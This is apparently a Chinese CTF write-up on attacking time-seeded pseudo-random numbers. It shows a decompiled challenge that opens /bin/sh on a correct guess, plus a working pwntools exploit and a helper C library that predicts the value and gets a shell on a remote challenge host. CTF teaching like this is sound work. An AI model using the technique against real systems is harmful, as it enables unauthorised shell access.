---
title: 11.19
---
伪随机数攻击
<!--more-->

## 伪随机
现在程序的随机数实现 都是伪随机，即随机数是通过一个 **伪随机数发生器** 生成的，而这个发生器通常具有以下部分
+ **seed** 整个序列的起点
+ **算法** 接受当前的内部状态（由种子决定），生成一个随机数，并且更新其中的内部状态，为生成的下一个数据做准备

重要特性:
+ 相同的种子，一定会产生相同的数列

在 PWN 中如果遇到与随机数相关的题目可以尝试调用C库来进行随机数攻击

### 例题 SDPC::CTF
存在如下
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int seed; // eax
  int v5; // [rsp+8h] [rbp-8h] BYREF
  int v6; // [rsp+Ch] [rbp-4h]

  seed = time(0);
  srand(seed);
  v6 = rand() % 100;
  __isoc99_scanf(&unk_402004, &v5);
  if ( v6 == v5 )
  {
    puts("You win!");
    system("/bin/sh");
  }
  else
  {
    printf("You lose! The number was %d\n", v6);
  }
  return 0;
}
```
可见程序设定了一个种子，种子的值等于当前时间戳, 然后生成一个 0 - 100 范围的随机数

于是我们可以构建如下脚本
```python
from pwn import *
import ctypes

# remote('175.27.251.122', 33360)
context.log_level = "info"
# p = process("./pwn")
p = remote("175.27.251.122", 32878)

lib = ctypes.CDLL("./a.so")
lib.randd.restype = ctypes.c_int
lib.init()

u = lib.randd()
# print(u)
p.sendline(str(u))
p.interactive()
```

```c
// a.c -> a.so
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

void init(void)
{
  srandom(time(0));
}

int randd(void)
{
  return random() % 100;
}
// gcc -shared -fPIC -o ./a.so ./a.c
```

### 总结
遇到这类题目可以通过 伪随机数的特性来进行攻击,注意在远程连接具有延迟问题可能需要多次尝试

